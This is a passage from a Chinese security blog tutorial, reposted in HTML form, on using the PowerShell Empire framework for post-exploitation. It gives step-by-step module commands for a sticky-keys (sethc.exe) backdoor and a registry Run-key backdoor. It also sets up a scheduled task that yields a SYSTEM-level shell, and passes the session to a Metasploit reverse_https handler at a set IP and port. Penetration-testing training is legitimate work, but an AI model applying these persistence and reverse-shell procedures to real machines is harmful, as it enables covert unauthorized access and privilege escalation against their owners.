onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpRTj82hcJBMRKPKtCgVtoxoL4HZrGTEJYHO3TwMQiafdvUuKPCaxIkmmQ/640?wx_fmt=png'" data-type="png" data-w="771"  /></p><p><span style="font-size:14px;line-height:34px;;">这里看我们的Empire已经有反弹代理上线，这里为了截图我按了3回shift后门，所以弹回来3个代理，如下图所示。</span></p><p><img class="" data-ratio="0.16" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/59_ahmT7GRichJ774oic0jEmBsAfJOg5w.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpR2mTNzmEfVIueGiazibKricRumvcclahmT7GRichJ774oic0jEmBsAfJOg5w/640?wx_fmt=png'" data-type="png" data-w="1075"  /></p><p><span style="font-size:14px;line-height:34px;;">注意：sethc.exe这里有几个可以替换的选项。</span></p><p><span style="font-size:14px;line-height:34px;;">A.Utilman.exe（快捷键为: Win + U）</span></p><p><span style="font-size:14px;line-height:34px;;">B.osk.exe（屏幕上的键盘Win + U启动再选择）</span></p><p><span style="font-size:14px;line-height:34px;;">C.Narrator.exe (启动讲述人Win + U启动再选择)</span></p><p><span style="font-size:14px;line-height:34px;;">D.Magnify.exe(放大镜Win + U启动再选择）</span></p><p><span style="font-size:14px;line-height:34px;;">2.注册表注入后门</span></p><p><span style="font-size:14px;line-height:34px;;">使用usemodule persistence/userland/registry模块，运行后会在目标主机启动项添加一个命令，按如下命令设置其中几个参数，如下图所示。</span></p><pre><span style="font-size:14px;line-height:34px;;">set&nbsp;Listener&nbsp;shuteer<br  />set&nbsp;RegPath&nbsp;HKCU:SoftwareMicrosoftWindowsCurrentVersionRun<br  />execute</span></pre><p><img class="" data-ratio="0.5812274368231047" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/60_H0gZevU5cibe3j0Q3wk34IbyQ9ggkQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpR9yNbU7DwNqFOBtaBwo6iaicvjW5H0gZevU5cibe3j0Q3wk34IbyQ9ggkQ/640?wx_fmt=png'" data-type="png" data-w="831"  /></p><p><span style="font-size:14px;line-height:34px;;">运行后当我们登陆系统时候就会运行，反弹回来，如下图所示。</span></p><p><img class="" data-ratio="0.11753554502369669" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/61_vGN268WKBicepqVrc12cUaaPENr8TQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpRf912TjgbwNlB5RmLAib8gIdlEPvGN268WKBicepqVrc12cUaaPENr8TQ/640?wx_fmt=png'" data-type="png" data-w="1055"  /></p><p><span style="font-size:14px;line-height:34px;;">我们去目标机主机看看启动项下面有没有添加东西，竟然没有，真是厉害，如下图所示。</span></p><p><img class="" data-backh="230" data-backw="368" data-before-oversubscription-url="https://p0.ssl.qhimg.com/t01e0571af69303f67a.png" data-ratio="0.625" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/62_wtQrzStFmZeVNaFM3ibKcAPFxHBmQg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpRzrqlxuk7wGwx3WJCzAT4gMkWmwtQrzStFmZeVNaFM3ibKcAPFxHBmQg/640?wx_fmt=png'" data-type="png" data-w="368" style="width: 100%;height: auto;"  /></p><p><span style="font-size:14px;line-height:34px;;">3.计划任务获得系统权限</span></p><p><span style="font-size:14px;line-height:34px;;">输入usemodule persistence/elevated/schtasks，使用该模块，输入info命令查看具体参数，如下图所示。在实际渗透中，运行该模块时杀软会有提示。</span></p><p><img class="" data-ratio="0.9611650485436893" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/63_6Dpy0Wocmw5TOoMGicEIkkOX9zrwUw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpRgIThybwHvWPHgC57TUBVSkh1U6Dpy0Wocmw5TOoMGicEIkkOX9zrwUw/640?wx_fmt=png'" data-type="png" data-w="824"  /></p><p><span style="font-size:14px;line-height:34px;;">这里要设置DailyTime，Listener这2个参数，输入下列命令，设置完后输入execute命令运行，等设置的时间到后，成功返回一个高权限的shell，如下图所示。</span></p><pre><span style="font-size:14px;line-height:34px;;">Set&nbsp;DailyTime&nbsp;16:17<br  />Set&nbsp;Listener&nbsp;<br  />testexecute</span></pre><p><img class="" data-ratio="0.12262658227848101" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/64_6RafibhVWqwLbUVzZWLrfaZIHV26ZA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpR4nUmjIqma5Zem3nFSNXvBkuGL6RafibhVWqwLbUVzZWLrfaZIHV26ZA/640?wx_fmt=png'" data-type="png" data-w="1264"  /></p><p><span style="font-size:14px;line-height:34px;;">我们输入agents命令来查看当前agents，可以看到又多了一个SYSTEM权限Name为LTVZB4WDDTSTLCGL的客户端，如下图所示，提权成功。</span></p><p><img class="" data-ratio="0.15567282321899736" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/65_qkO2Pfl9dWuIrBQpqCcvY7OXCRUmrg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpRuSISiceCkA8Dy5NWG9vdMUTjWqkO2Pfl9dWuIrBQpqCcvY7OXCRUmrg/640?wx_fmt=png'" data-type="png" data-w="1137"  /></p><p><span style="font-size:14px;line-height:34px;;">这里如果把set RegPath 的参数改为HKCU:SOFTWAREMicrosoftWindowsCurrentVersionRun，那么就会在16：17分添加一个注册表注入后门，大家可以练习一下。</span></p><p><span style="font-size:14px;line-height:34px;;"><br  /></span></p><h2 name="h2-5"><strong><span style="font-size:14px;line-height:34px;;">0×09. &nbsp;Empire反弹回Metasploit</span></strong></h2><p><strong><span style="font-size:14px;line-height:34px;;"><br  /></span></strong></p><p><span style="font-size:14px;line-height:34px;;">实际渗透中，当拿到webshell上传的MSF客户端无法绕过目标机杀软时，可以使用powershell来绕过也可以执行Empire的payload来绕过，成功之后再使用Empire的模块将其反弹回Metasploit。</span></p><p><span style="font-size:14px;line-height:34px;;">这里使用usemodule code_execution/invoke_shellcode模块，输入info看下参数，如下图所示。</span></p><p><img class="" data-ratio="0.8299120234604106" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/66_NDHrsCFPuJ9cLibnlHwib49Re2rCBg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpRzFZzibiaBAb55fiaP2zdV5T2tsWf9NDHrsCFPuJ9cLibnlHwib49Re2rCBg/640?wx_fmt=png'" data-type="png" data-w="682"  /></p><p><span style="font-size:14px;line-height:34px;;">这里修改2个参数，Lhost和Lport，Lhost修改为msf所在主机ip，按下列命令设置完毕，如下图所示。</span></p><pre><span style="font-size:14px;line-height:34px;;">Set&nbsp;Lhost&nbsp;192.168.31.247<br  />Set&nbsp;Lport&nbsp;4444</span></pre><p><img class="" data-ratio="0.12903225806451613" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/67_ggjEUpk9LNgnyNlMibrLUPg3GX1LQQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpRg87JO0ibNgN21GVlsuzZnCKhElggjEUpk9LNgnyNlMibrLUPg3GX1LQQ/640?wx_fmt=png'" data-type="png" data-w="620"  /></p><p><span style="font-size:14px;line-height:34px;;">在MSF上设置监听，命令如下，运行后，就可以收到Empire反弹回来的shell了，如下图所示。</span></p><pre><span style="font-size:14px;line-height:34px;;">Use&nbsp;exploit/multi/handler<br  />Set&nbsp;payloadwindows/meterpreter/reverse_https<br  />Set&nbsp;Lhost&nbsp;192.168.31.247<br  />Set&nbsp;lport&nbsp;4444Run</span></pre><p><img class="" data-ratio="0.25113636363636366" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/68_YZRv07bqb1ztic6g631hHKZ8ddsvTA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpRKy4RBs0vXdWx3hRPw0vTyKzWQYZRv07bqb1ztic6g631hHKZ8ddsvTA/640?wx_fmt=png'" data-type="png" data-w="880"  /></p><p><br  /></p><p><img data-type="png" class="" data-ratio="0.109375" data-w="640" data-backw="501" data-backh="54" data-before-oversubscription-url="https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/69_rsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png'" style="color: rgb(51, 51, 51);font-size:17px;line-height:37px;;letter-spacing: 0.544px;white-space: normal;text-align: justify;font family: -apple-system-font, system-ui, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;background-color: rgb(255, 255, 255);visibility: visible !important;width: 639.6px !important;"  /></p><p style="text-align: center;"><span style="font-size:12px;line-height:32px;;color: rgb(136, 136, 136);">文章转载自：安全客，作者：shuteer</span></p><p><img class="" data-copyright="0" data-ratio="0.3281027104136947" data-s="300,640" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/70_9kZ6Bzp6HKPIkCGYkfBsPynR63cBgg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou85etJYTkncLGY4Biavb6ibNajxPOSFB9UFWD40tY4uCrHqy59kZ6Bzp6HKPIkCGYkfBsPynR63cBgg/640?wx_fmt=png'" data-type="png" data-w="701" style=""  /></p><p><br  /></p>
                </div>
</div>
</body>
</html>